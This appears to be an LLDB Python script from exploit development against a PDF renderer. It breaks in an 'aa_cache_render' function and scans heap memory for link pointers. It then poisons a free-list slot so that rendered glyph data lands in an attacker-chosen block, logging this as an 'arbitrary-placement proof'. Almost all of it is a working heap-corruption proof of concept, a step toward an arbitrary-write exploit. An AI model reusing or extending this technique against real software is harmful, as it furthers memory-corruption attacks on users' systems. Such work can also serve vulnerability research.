# RIP-20b: poison-to-arbitrary-write — link-scan + data-in-chosen-block proof.
import os, sys, struct, time
import lldb
t = lldb.debugger.GetSelectedTarget()
CWD = os.getcwd()
TRACE = open(os.path.join(CWD, "rip20_trace.txt"), "a")
def T(s): print(s); TRACE.write(s+"\n"); TRACE.flush()
err = lldb.SBError()

def qwords(p, addr, n):
    m = p.ReadMemory(addr, n*8, err)
    if not err.Success() or not m: return None
    return [struct.unpack('<Q', m[i*8:i*8+8])[0] for i in range(n)]

def wr(p, addr, data):
    p.WriteMemory(addr, data, err)
    return err.Success()

def cleanup(bps):
    for b in bps:
        if b: t.BreakpointDelete(b.GetID())

def stop5():
    old = t.GetProcess()
    if old and old.IsValid() and old.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
        old.Kill(); time.sleep(0.2)
    bpe = t.BreakpointCreateByName("aa_cache_render")
    p = t.LaunchSimple(["k2_d31472.pdf", "r.png"], None, CWD)
    if not p or not p.IsValid(): return None, None, None, None
    th = p.GetSelectedThread()
    pc = th.GetSelectedFrame().GetPCAddress().GetLoadAddress(t)
    bpw = t.BreakpointCreateByAddress(pc + 1804)
    x19 = x27 = 0
    for i in range(5):
        p.Continue()
        st = p.GetState()
        while st == lldb.eStateRunning: time.sleep(0.1); st = p.GetState()
        if st != lldb.eStateStopped: break
        fr = p.GetSelectedThread().GetSelectedFrame()
        x19 = fr.FindRegister("x19").GetValueAsUnsigned()
        x27 = fr.FindRegister("x27").GetValueAsUnsigned()
        if x19: break
    return p, x19, x27, (bpe, bpw)

# P1: link-scan recon
p, x19, x27, bps = stop5()
if not p:
    T("P1 launchfail"); TRACE.close(); sys.exit(0)
T("P1 x19=%x x27=%x" % (x19, x27))
qs = qwords(p, x19, 64)
links = [(j*8, hex(q)) for j, q in enumerate(qs or []) if 0x100000000 <= q < 0x800000000000]
T("P1 x19 links: %s" % links)
cleanup(bps); p.Kill()

# P3 (primary): poison first link slot -> chosen block -> glyph data lands
p, x19, x27, bps = stop5()
if not p or not x19:
    T("P3 nox19"); cleanup(bps); TRACE.close(); sys.exit(0)
qs = qwords(p, x19, 64)
slot = None
for j, q in enumerate(qs or []):
    if 0x100000000 <= q < 0x800000000000:
        slot = x19 + j*8; break
if slot is None:
    slot = x19  # fallback: head slot even if empty
blk = (x27 - 0x4000) + 0x100
wr(p, blk, bytes(0x200))  # zero landing zone
oldslot = qwords(p, slot, 1)
wr(p, slot, struct.pack('<Q', blk))
T("P3 poison slot=%x (was %s) -> blk=%x" % (slot, hex(oldslot[0]) if oldslot else "?", blk))
for b in bps:
    if b and b.GetID() != bps[1].GetID(): t.BreakpointDelete(b.GetID())
bps[1].SetOneShot(False)
p.Continue()
st = p.GetState()
while st == lldb.eStateRunning: time.sleep(0.1); st = p.GetState()
if st == lldb.eStateStopped:
    data = p.ReadMemory(blk, 0x80, err)
    if err.Success() and data:
        nz = sum(1 for b in data if b)
        T("P3 BLOCK-CONTENT: nonzero=%d/128 first16=%s" % (nz, data[:16].hex()))
        if nz:
            T("P3 DATA-IN-CHOSEN-BLOCK = ARBITRARY-PLACEMENT PROOF ✅")
    else:
        T("P3 read fail")
    now = qwords(p, slot, 1)
    T("P3 slot now: %s (consumed=%s)" % (hex(now[0]) if now else "?", now and now[0] != blk))
    p.Kill()
else:
    T("P3 exited rc=%s" % p.GetExitStatus())
cleanup(bps)
T("RIP-20 DONE")
TRACE.close()
